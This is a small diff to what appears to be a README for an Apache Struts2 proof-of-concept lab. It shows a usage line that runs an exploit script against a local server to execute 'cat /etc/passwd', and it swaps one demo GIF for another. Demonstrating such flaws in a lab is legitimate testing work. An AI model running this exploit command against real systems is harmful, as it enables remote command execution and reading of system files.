@@ -50,4 +50,6 @@ ubuntu@brett-jumpbox:~/apache-struts2-PoC$
 curl 127.0.0.1:8080/showcase.action -v  
 #python3 -m venv .  
 python exploitS2-048-cmd.py 127.0.0.1:8080 'cat /etc/passwd'  
-![apache_struts_poc](https://user-images.githubusercontent.com/4404271/152885401-97a37adf-6aa8-4b97-847a-c665889b9b60.gif)
+![struts_rs](https://user-images.githubusercontent.com/4404271/153033823-b0d10a6b-4faa-4f0e-b8d1-8dde69cf1562.gif)
+
+
